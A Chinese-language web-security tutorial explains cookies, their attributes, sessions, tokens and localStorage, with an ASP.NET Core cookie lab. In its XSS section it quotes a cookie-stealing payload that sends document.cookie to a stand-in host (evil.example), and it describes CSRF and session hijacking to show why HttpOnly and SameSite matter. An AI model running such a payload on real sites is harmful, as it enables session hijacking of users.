補充：Cookie 是什麼，還有哪些類似的東西（Session、Token、localStorage）

XSS 那張圖裡被偷走的 cookie 到底是什麼？伺服器怎麼給、瀏覽器怎麼帶、為什麼偷到就能冒充你？Session、Token、localStorage 又和它差在哪？

1. HTTP 不記得你：為什麼需要 cookie

每一個 HTTP 請求都是獨立的一封信。伺服器收到、處理、回覆，然後就忘了。下一封信來的時候，伺服器不知道它和上一封是不是同一個人寄的。這叫 HTTP 的無狀態（stateless）。

用一個會回答「你是誰」的 endpoint 實際試：連打兩次 GET /me，伺服器兩次都說不認識你。

GET /me
→ 200 OK
沒有 cookie，不知道你是誰

GET /me
→ 200 OK
沒有 cookie，不知道你是誰

可是部落格登入之後，再點「我的文章」，伺服器得知道你是誰。要讓無狀態的 HTTP 認得出「這幾封信是同一個人寄的」，就得在每封信上放一個記號。這個記號最常見的做法，就是 cookie。

2. Cookie 是什麼：一張瀏覽器自動帶的號碼牌

詞做什麼目的是什麼
Cookie伺服器在回應的 header 裡放一行 Set-Cookie: 名字=值；瀏覽器記下這段文字，之後每次對同一個網站的請求，自動在 header 裡加一行 Cookie: 名字=值 帶回去讓無狀態的 HTTP 認得出「這幾個請求是同一個人」
上排：沒有號碼牌，每次都是陌生人。下排：第一次回應發號碼牌，之後瀏覽器自己每次帶回

把下排的流程用實際的 HTTP header 走一次（第 6 節的小程式跑出來的）：

sequenceDiagram participant B as 瀏覽器 participant S as 你的 API B->>S: GET /me（沒有 Cookie header） S-->>B: 200「沒有 cookie，不知道你是誰」 B->>S: GET /login S-->>B: 200 + Set-Cookie: user=alice Note over B: 瀏覽器把 user=alice 放進 cookie 罐 B->>S: GET /me + Cookie: user=alice（瀏覽器自動加） S-->>B: 200「你是 alice」 B->>S: 之後每一個請求都自動帶 Cookie: user=alice
Set-Cookie 是伺服器→瀏覽器的 header，Cookie 是瀏覽器→伺服器的 header，名字差一個 Set

🔍 實測：用 curl 看原始 header。/login 的回應多了一行 Set-Cookie；把那個值放進 Cookie header 再打 /me，伺服器就認得你：

GET /login
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Server: Kestrel
Set-Cookie: user=alice; max-age=1800; path=/; samesite=lax; httponly

已登入，看回應 header 裡的 Set-Cookie

GET /me　　（這次 header 裡有 Cookie: user=alice）
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Server: Kestrel

你是 alice

四件事要抓住：

  • 瀏覽器自動帶。前端程式一行都沒寫，瀏覽器自己在每個請求加上 Cookie header。這是 cookie 最大的方便，也是它所有安全問題的來源：只要是「從這個瀏覽器發出、送往這個網站」的請求，不管是誰觸發的，都帶著。
  • 綁網站。cookie 屬於發它的那個網站。對 localhost:5050 的請求才會帶 user=alice，對別的網站不帶，別的網站也看不到它。
  • 只是文字。伺服器給什麼，瀏覽器就記什麼，沒有加密。所以 cookie 裡放的通常是「識別用的鑰匙」（一串亂數、一個簽過名的憑證），不是密碼這種機密本身。
  • 在哪裡看。瀏覽器 F12 → Application → Cookies；或 curl -i 看回應 header；或 Rider 的 .http 檔，回應 header 會直接列出來。

正式語法：ASP.NET Core 怎麼發、怎麼讀

要做的事寫法官方文件
發 cookie（回應加 Set-Cookie）Response.Cookies.Append("user", "alice", new CookieOptions { … });IResponseCookies.Append
讀 cookie（從請求的 Cookie header 拿）string? user = Request.Cookies["user"];，沒有就是 nullIRequestCookieCollection
刪 cookie（叫瀏覽器丟掉）Response.Cookies.Delete("user");，實際是送一個已過期的 Set-Cookie同上
設屬性CookieOptions 的 HttpOnly、SameSite、Secure、MaxAge、PathCookieOptions

在 Controller 裡，Request 和 Response 是 ControllerBase 的屬性，直接用；在 Minimal API 的 lambda 裡要先接一個 HttpContext 參數，再用 context.Request、context.Response。

3. Cookie 的屬性：給號碼牌加規則

第 2 節那行 Set-Cookie 分號後面的東西就是屬性。它們不會被帶回伺服器，是寫給瀏覽器看的規則：這張號碼牌什麼時候帶、什麼時候不帶、誰能碰。

Set-Cookie: user=alice; max-age=1800; path=/; samesite=lax; httponly
            ─────┬────  ────┬───────  ──┬───  ─────┬──────  ───┬────
            名字=值      30 分鐘後失效   全站都帶  別站連過來少帶  JS 讀不到
屬性做什麼目的是什麼
Max-Age / Expires多久之後失效。兩個都沒設的話，瀏覽器關掉就消失，叫 session cookie控制號碼牌的有效期
Path只有網址路徑在這底下才帶。/ 就是全站縮小帶的範圍
Domain哪些網域會帶。沒設就只有發它的那一台主機縮小帶的範圍，或讓子網域共用
Secure只在 https 連線才帶不在明文連線上外洩。本機用 http 測試時先不設
HttpOnlyJavaScript 的 document.cookie 讀不到它，但請求照樣自動帶XSS 的程式碼偷不走它（第 5 節）
SameSiteStrict：從別的網站連過來的請求一律不帶。Lax：只有「點連結這種最上層的 GET」才帶。None：都帶，但必須同時 Secure防 CSRF（下面的補充）。ASP.NET Core 的 CookieOptions.SameSite 預設是 Unspecified，也就是不輸出這個屬性；現在的瀏覽器把沒寫的當成 Lax
📎 補充：SameSite 在防什麼（CSRF）

「瀏覽器自動帶」有一個副作用：請求不一定是你的網站觸發的。假設你登入了 blog.example，cookie 還有效。這時你打開一個惡意網站，它的頁面裡藏了一個指向 blog.example/api/posts/1 的刪除請求。瀏覽器看到目的地是 blog.example，就照規則把 cookie 帶上，伺服器看到有效的號碼牌，就真的刪了。你什麼都沒點，文章就不見了。這叫 CSRF（跨站請求偽造）。

SameSite=Lax 讓瀏覽器在「從別的網站發起」的請求上不帶 cookie（除了點連結這種最上層的 GET），惡意網站的請求就變成沒有號碼牌的陌生人。這是 SameSite 存在的理由。官方說明：Work with SameSite cookies in ASP.NET Core。

4. 類似的東西：Session、Token、localStorage

「記得你是誰」不是只有 cookie 一種做法。常聽到的四個東西，用五個問題拆開比：

東西存在哪裡誰把它放進請求伺服器能設定它嗎JavaScript 讀得到嗎什麼時候消失
Cookie瀏覽器的 cookie 罐瀏覽器自動能（Set-Cookie）預設能；設 HttpOnly 後不能Max-Age 到期、關瀏覽器（沒設期限時）、伺服器 Delete
Session（伺服器端）伺服器（記憶體、Redis、資料庫）。瀏覽器只拿到一個裝著 session id 的 cookie瀏覽器自動（id 在 cookie 裡）能資料本身讀不到，只有 id 的 cookie閒置逾時（ASP.NET Core 預設 20 分鐘）或伺服器清掉
Token（例如 JWT）放 Authorization header前端程式決定：變數、localStorage、也可以放 cookie前端程式自己加 Authorization: Bearer …發得出來，但放哪裡由前端決定看放哪裡：放 localStorage 就讀得到token 本身有到期時間
localStorage / sessionStorage瀏覽器，伺服器完全看不到從不自動帶不能能localStorage 到你清掉為止；sessionStorage 關分頁就消失
左邊住在瀏覽器，右邊住在伺服器；綠色箭頭是瀏覽器自動帶的，藍色箭頭是前端程式自己加的

表格裡最重要的是「誰把它放進請求」和「JavaScript 讀得到嗎」這兩欄，因為它們決定各自怕什麼：

  • 瀏覽器自動帶的（cookie、靠 cookie 的 session）：方便，但別的網站也能借你的瀏覽器發請求，所以要靠 SameSite 擋 CSRF。
  • 前端程式自己帶的（token）：別的網站的程式碼拿不到你的 token，沒有 CSRF 的問題；但 token 放在 localStorage 時 JavaScript 讀得到，XSS 一來就被整個搬走。
  • Session 不是和 cookie 對立的東西，而是「資料放伺服器、cookie 裡只放鑰匙」的用法。鑰匙丟了一樣會被冒充，所以上面關於 cookie 的規則它全部適用。

你的 Web API 之後給前端（React 之類）用，第 5 課會用 JWT 走 token 這條路；傳統「伺服器產生整個網頁」的網站多半走 cookie + session。這頁只看它們住在哪、誰帶；JWT 裡面長什麼樣留到第 5 課。

📎 補充：ASP.NET Core 的 Session 怎麼開

Session 在 ASP.NET Core 不是預設開的，要在 Program.cs 登記兩行：

// 登記 session 服務；資料預設放在這台伺服器的記憶體裡
builder.Services.AddSession();

// 加進 pipeline：每個請求進來先找 cookie 裡的 session id，對應到伺服器上的那份資料
app.UseSession();

之後 HttpContext.Session.SetString("user", "alice") 寫、GetString("user") 讀。瀏覽器拿到的 cookie 名字預設是 .AspNetCore.Session，值是一串加密過的 id，資料本身不在裡面。官方文件：Session and state management in ASP.NET Core。

5. 回到 XSS：偷到 cookie 為什麼就能冒充你

編碼器那頁 3-1 的攻擊字串是 fetch("https://evil.example/?c=" + document.cookie)。現在可以把它拆開了：

  • document.cookie 讀的是這個網站所有沒設 HttpOnly 的 cookie，格式像 user=alice; theme=dark。
  • 攻擊者拿到 user=alice 之後，在自己的瀏覽器設一個一模一樣的 cookie，再打 GET /me。伺服器只看號碼牌，號碼牌一樣，就把他當成 alice。這叫 session hijacking（劫持）。
  • 設了 HttpOnly，document.cookie 就看不到 user=alice，上面那段程式碼送出去的是空的。這是 HttpOnly 的價值。
  • 但 XSS 的程式碼還是在你的網站上跑。它可以直接 fetch("/api/posts/1", { method: "DELETE" })，瀏覽器看到目的地是你的網站，照樣自動帶 cookie，伺服器照樣當成 alice 在操作。HttpOnly 擋得了「偷走號碼牌」，擋不了「借用你的瀏覽器」。

所以順序是：先用輸出時編碼讓 XSS 根本跑不起來，再用 HttpOnly 當第二道保險。兩個都要。

6. 小實驗：起一個會發 cookie 的小網站

第 2 節的 header 就是這個實驗跑出來的。不用開專案，一個 .cs 檔就能起網站。

正式語法：.NET 10 單檔程式起一個 Web 伺服器

// 第一行：告訴 SDK 這是 Web 專案，不然沒有 WebApplication 這些型別
#:sdk Microsoft.NET.Sdk.Web

WebApplicationBuilder builder = WebApplication.CreateBuilder(args);
WebApplication app = builder.Build();

// 一個 endpoint：lambda 接 HttpContext 就能碰 Request 和 Response
app.MapGet("/hello", (HttpContext context) => "hi");

// 指定網址和 port 啟動；終端機按 Ctrl+C 停掉。port 被佔用就換一個數字
app.Run("http://localhost:5050");
# 放在任何「沒有 .csproj」的資料夾
dotnet run cookie-lab.cs

官方文件：File-based apps（#:sdk 指令在這頁）、Minimal APIs（MapGet）。這個實驗只回傳字串，不需要編碼器那頁第 8 節說的 PublishAot 設定；如果你改成回傳物件（JSON），會不會需要，自己試試看。

實驗：/login 發號碼牌，/me 認人

需求：

  • GET /login：發一個名字 user、值 alice 的 cookie，設 HttpOnly、SameSite=Lax、30 分鐘後失效；回傳一句話
  • GET /me：讀 user 這個 cookie。有就回「你是 alice」，沒有就回「沒有 cookie，不知道你是誰」
  • 用 curl -i 或 Rider 的 .http 檔先打 /me、再打 /login 看 Set-Cookie、再帶著 cookie 打 /me
  • 用瀏覽器打開 /login 再打開 /me，看瀏覽器自己帶了；F12 → Application → Cookies 看那張號碼牌

🧪 先故意少做一件事：第一次先不設 HttpOnly，用瀏覽器開 /login，F12 → Console 打 document.cookie，看到什麼？加上 HttpOnly 重跑，再打一次。這就是第 5 節第三點。

✅ 驗收：/login 的回應 header 有 Set-Cookie: user=alice; max-age=1800; path=/; samesite=lax; httponly；帶 cookie 打 /me 回「你是 alice」，不帶回「沒有 cookie，不知道你是誰」；設 HttpOnly 後 document.cookie 是空字串

參考答案（寫完再打開）

cookie-lab.cs

#:sdk Microsoft.NET.Sdk.Web

WebApplicationBuilder builder = WebApplication.CreateBuilder(args);
WebApplication app = builder.Build();

// 登入：伺服器在回應裡放一個 Set-Cookie header，瀏覽器收到就會記起來
app.MapGet("/login", (HttpContext context) =>
{
    CookieOptions options = new CookieOptions
    {
        HttpOnly = true,              // JavaScript 的 document.cookie 讀不到
        SameSite = SameSiteMode.Lax,  // 從別的網站連過來的請求，大部分不帶這個 cookie
        MaxAge = TimeSpan.FromMinutes(30)
    };
    context.Response.Cookies.Append("user", "alice", options);
    return "已登入，看回應 header 裡的 Set-Cookie";
});

// 之後的請求：瀏覽器自動把 cookie 放進 Cookie header 帶回來，伺服器從 Request.Cookies 讀
app.MapGet("/me", (HttpContext context) =>
{
    string? user = context.Request.Cookies["user"];
    return user is null ? "沒有 cookie，不知道你是誰" : "你是 " + user;
});

app.Run("http://localhost:5050");
